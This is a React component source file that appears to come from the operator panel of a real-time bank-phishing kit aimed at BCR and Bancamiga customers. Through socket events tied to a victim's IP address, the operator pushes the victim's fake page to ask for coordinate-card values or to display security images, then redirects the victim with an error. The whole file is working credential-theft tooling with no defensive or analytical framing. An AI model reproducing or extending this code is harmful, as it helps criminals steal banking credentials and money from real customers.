
import { useFormik } from "formik"
import {Popover, Button, PopoverTrigger, PopoverContent, Checkbox} from '@nextui-org/react';
import { useState } from "react";

export const ErrorIconLive = ({socket, ip, nameBank, urlPage, onClose, textPage}) => {
  
  const [formView, setFormView] = useState(false)
  const [isSelected, setIsSelected] = useState(false)

  const {values, handleBlur, handleChange, handleSubmit } = useFormik({
    initialValues: {
      image: '',
      coordinate1: '',
      coordinate2: '',
      coordinate3: '',
    },
    onSubmit: async({image,  coordinate1,coordinate2,coordinate3}) =>{
      if(textPage == 'Token + Coordenadas' || textPage == 'Coordenadas') socket.emit('[bcr] getCoordinates', {coordinate1,coordinate2,coordinate3, ip})
      if(textPage == 'Metodo seguridad') socket.emit('[bancamiga] getImage', {image, ip})
      if(textPage == 'Imagen') {
        (isSelected) 
        ? socket.emit('[bancamiga] getListImage', {listImage: JSON.parse(await navigator.clipboard.readText()), ip}) 
        : socket.emit('[bancamiga] getListImage', {listImage: JSON.parse(image), ip})
    }
      socket.emit('[live] panelSendRedirect', { ip, urlPage, errorBag: true, nameBank })
      setFormView(false)
      onClose()
    }
  })
  const sendBagRedirect = () => {
    if(textPage == 'Metodo seguridad' || textPage == 'Imagen' || textPage == 'Metodo de token' || textPage == 'Token + Coordenadas' || textPage == 'Coordenadas') return setFormView(true)
    socket.emit('[live] panelSendRedirect', { ip, urlPage, errorBag: true, nameBank })
    onClose()
  }
  
  return (
    <div>
      <Popover  isOpen={formView} onOpenChange={(open) => sendBagRedirect()} placement="right">
        <PopoverTrigger onClick={() => sendBagRedirect()} >
          <div className="cursor-pointer">
            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor" className="w-6 h-6">
              <path strokeLinecap="round" strokeLinejoin="round" d="M6 18 18 6M6 6l12 12" />
            </svg>
          </div>
        </PopoverTrigger>
        <PopoverContent >
          <form onSubmit={handleSubmit} className={'p-2 flex gap-2 flex-col'}>
           
          {
              textPage == 'Token + Coordenadas' || textPage == 'Coordenadas' ? (
                  <>
                    <p>Manda tus coordenadas BCR</p>
                    <span>coordenada1</span>
                    <input required autoComplete="false" className="w-full py-1 pl-2" type="text" name="coordinate1" value={values.coordinate1.toString().slice(0,2)} onChange={handleChange} />
                    
                    <span className="mt-2">coordenada2</span>
                    <input  autoComplete="false" className="w-full py-1 pl-2 mb-2" type="text" name="coordinate2" value={values.coordinate2.toString().slice(0,2)} onChange={handleChange} />
                    <span>coordenada3</span>
                    <input  autoComplete="false" className="w-full py-1 pl-2" type="text" name="coordinate3" value={values.coordinate3.toString().slice(0,2)} onChange={handleChange} />
                  </>

              ) : null
            }
            {
              textPage == 'Metodo seguridad' ? (
                  <>
                    <p>Introduce el link de la imagen</p>
                    <input disabled={isSelected} required autoComplete="false" className="w-full py-1 " type="text" name="image" value={values.image} onChange={handleChange} />
                    
                    <Checkbox isSelected={isSelected} onValueChange={setIsSelected}>
                      Omitir foto
                    </Checkbox>
                  </>
              ) : null
            }

            {
              textPage == 'Imagen' ? (
                  <Checkbox isSelected={isSelected} onValueChange={setIsSelected}>
                    Enviar lo copiado
                  </Checkbox>
              ) : null
            }

            <Button className="w-full mt-5" type="submit" color="primary" variant="shadow" size="sm" >ENVIAR</Button>
          </form>
        </PopoverContent>
      </Popover>
      
      
    </div>
  )
}
